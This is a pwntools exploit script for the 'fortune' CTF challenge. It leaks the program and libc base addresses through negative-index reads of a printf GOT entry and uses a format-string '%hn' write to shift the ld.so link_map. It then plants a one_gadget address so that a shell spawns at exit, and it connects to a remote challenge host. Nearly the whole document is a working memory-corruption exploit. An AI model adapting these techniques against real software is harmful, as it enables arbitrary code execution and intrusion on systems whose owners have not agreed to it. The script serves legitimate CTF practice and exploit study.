#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("fortune_patched")
libc = ELF('./libc.so.6')

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget(libc.path, libc.address)

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = 'blackhat.flagyard.com','30056'

if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = gdb.debug([exe.path], gdbscript = '''
    source ~/gdb.plugins/gef.bata24.git/gef.py
    gef config context.show_opcodes_size 9
    si
#    brva 0x136c
#    brva 0x1318
#    brva 0x132b
#    brva 0x136c
    brva 0x13ba
    b __run_exit_handlers
    c
     ''')
  else:
    p = process([exe.path])

def get(idx):
  sla('> ','1')
  sla(': ', str(idx))

def set(msg):
  sla('> ','2')
  sa(': ', msg)

# first leak .bss address
get(-19)
leak = u64(rcu('\n', '\n').ljust(8,b'\x00'))
exe.address = leak-0x4008
# calculate program base mapping address
logleak('prog base = ', exe.address)
# put exe.got address on .bss
set(p64(exe.got['printf'])+b'\n')
# print it
get(-16)
# calculate libc base address from printf address leak
libc.address = u64(rcu('\n', '\n').ljust(8,b'\x00'))-libc.sym['printf']
# print libc base address
logbase()
 
onegadgets = one_gadget(libc.path, libc.address)
target = onegadgets[8]

# overwrite link_map address on stack to shift l_addr
set('%'*0x10+'%'+(str((exe.address & 0xffff)+(0x4020-0x3d88)))+'c%32$hn'+'\n')
set(p64(exe.address+0x4030)+b'\n')
get(-16)

# write onegadget address on .bss, it will be executed at exit, via __run_exit_handlers
# as explained here:  https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#2---targetting-ldso-link_map-structure
#
set(p64(target)+b'\n')
# now we exit
sla('> ', '3')

p.interactive()


